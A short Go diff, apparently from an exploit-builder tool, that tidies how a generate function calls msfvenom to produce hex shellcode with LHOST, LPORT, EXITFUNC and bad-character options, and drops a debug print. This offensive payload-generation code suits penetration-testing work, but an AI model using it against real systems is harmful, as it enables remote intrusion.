@@ -171,8 +171,7 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 	venomCmd := path.Join(c.MsfPath, "msfvenom")
 	//venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
 	//out, err := exec.Command(venomCmd, venomArgs).Output()
-	cmd := exec.Command(venomCmd, fmt.Sprint("-p "+ptype), fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-f hex", "-o payload.txt")
-	fmt.Println(fmt.Sprint("-p "+ptype), fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-f hex", "-o payload.txt")
+	cmd := exec.Command(venomCmd, fmt.Sprint("-p "+ptype), fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), fmt.Sprintf("-f %s", "hex"), "-o payload.txt")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err := cmd.Run()
